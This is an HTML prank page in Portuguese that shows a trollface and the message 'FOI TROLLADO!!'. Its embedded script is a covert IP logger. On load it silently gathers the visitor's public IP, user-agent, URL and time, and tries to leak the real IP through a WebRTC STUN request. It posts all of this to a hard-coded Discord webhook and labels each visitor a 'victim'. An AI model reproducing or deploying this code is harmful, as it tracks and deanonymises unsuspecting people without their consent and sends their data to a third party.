<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trollado</title>
    <style>
        body {
            background: black;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 40px 20px;
            overflow: hidden;
        }
        h1 {
            color: #ff0000;
            font-size: 4em;
            text-shadow: 0 0 20px red;
            margin: 40px 0 30px 0;
        }
        img {
            max-width: 380px;
            margin: 30px 0;
            animation: shake 0.7s infinite alternate;
        }
        @keyframes shake {
            from { transform: rotate(-10deg); }
            to   { transform: rotate(10deg); }
        }
    </style>
</head>
<body>

    <h1>FOI TROLLADO!!</h1>
    <img src="https://upload.wikimedia.org/wikipedia/pt/thumb/7/73/Trollface.png/250px-Trollface.png" alt="Trollface">

    <!-- Nenhum texto de status aqui - totalmente limpo -->

    <script>
        // === SEU WEBHOOK ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1498101013809332416/BgXiCf3WAVsC-ejsvT7mAof1SWTMUh0ONTNQXYlNHqTKMUIFcMGJj5WqIExDHPM44-z1";

        async function sendToDiscord(conteudo) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: conteudo,
                        username: "Troll Logger",
                        avatar_url: "https://upload.wikimedia.org/wikipedia/pt/thumb/7/73/Trollface.png/250px-Trollface.png"
                    })
                });
            } catch (e) {}
        }

        // IP Público
        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                const msg = `**🚨 NOVA VÍTIMA TROLLADA!**\n` +
                            `**IP Público:** \`${data.ip}\`\n` +
                            `**User-Agent:** \`${navigator.userAgent}\`\n` +
                            `**URL:** ${window.location.href}\n` +
                            `**Horário:** ${new Date().toLocaleString('pt-BR')}`;

                await sendToDiscord(msg);
            } catch (e) {}
        }

        // IP Real via WebRTC
        function getWebRTCIP() {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" }
                    ]
                });

                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (event) => {
                    if (!event.candidate) return;
                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
                    if (match && match[1]) {
                        sendToDiscord(`**🔥 IP Real (WebRTC):** \`${match[1]}\``);
                    }
                };
            } catch (e) {}
        }

        // Inicia tudo automaticamente e em SILÊNCIO TOTAL
        window.onload = function() {
            getPublicIP();
            getWebRTCIP();

            // Trollagens extras (só no Discord)
            setTimeout(() => sendToDiscord("😂 **Alguém foi trollado com sucesso!**"), 1200);
            setTimeout(() => sendToDiscord("💀 **Mais uma vítima caiu no trollface clássico**"), 3500);
        };
    </script>

</body>
</html>
